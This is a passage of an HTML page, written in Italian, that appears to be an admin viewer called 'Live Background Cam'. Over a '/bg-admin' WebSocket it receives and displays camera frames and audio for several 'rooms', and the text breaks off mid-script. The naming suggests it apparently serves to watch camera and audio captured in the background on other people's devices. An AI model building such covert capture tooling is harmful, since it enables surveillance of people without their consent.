<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Live Background Cam</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<style>
body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:15px; }
.cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; position:relative; padding-bottom:40px; }
.cam img, .cam audio { width:100%; display:block; margin-bottom:5px; }
h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
.status { color:#0f0; font-size:12px; text-align:center; padding:4px; position:absolute; bottom:35px; left:0; right:0; background:rgba(0,0,0,0.7); }
.controls { position:absolute; bottom:0; left:0; width:100%; text-align:center; padding:5px; background:rgba(0,0,0,0.9); }
.controls button { background:#0f0; color:#000; border:none; padding:6px 12px; margin:0 5px; cursor:pointer; border-radius:6px; font-weight:bold; font-size:14px; }
</style>
</head>
<body>
<h1>Camera + Audio in Background</h1>
<div id="grid" class="grid"></div>

<script>
const grid = document.getElementById('grid');
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-admin`);
const rooms = new Map();
const imageCache = new Map();
let lastUpdate = Date.now();

ws.onopen = () => console.log('âœ… Admin connesso');
ws.onerror = e => console.error('WebSocket error:', e);
ws.onclose = () => console.warn('WebSocket chiuso');

ws.onmessage = e => {
  if (e.data instanceof Blob) {
    const currentRoom = localStorage.getItem('currentRoom');
    if (!currentRoom) return;
    const roomData = rooms.get(currentRoom);
    if (!roomData || !roomData.img) return;
    if (Date.now() - lastUpdate < 50) return; // 20 FPS circa
    const oldUrl = imageCache.get(currentRoom);
    if (oldUrl) URL.revokeObjectURL(oldUrl);
    const newUrl = URL.createObjectURL(e.data);
    roomData.img.src = newUrl;
    imageCache.set(currentRoom, newUrl);
    const statusEl = document.getElementById('status
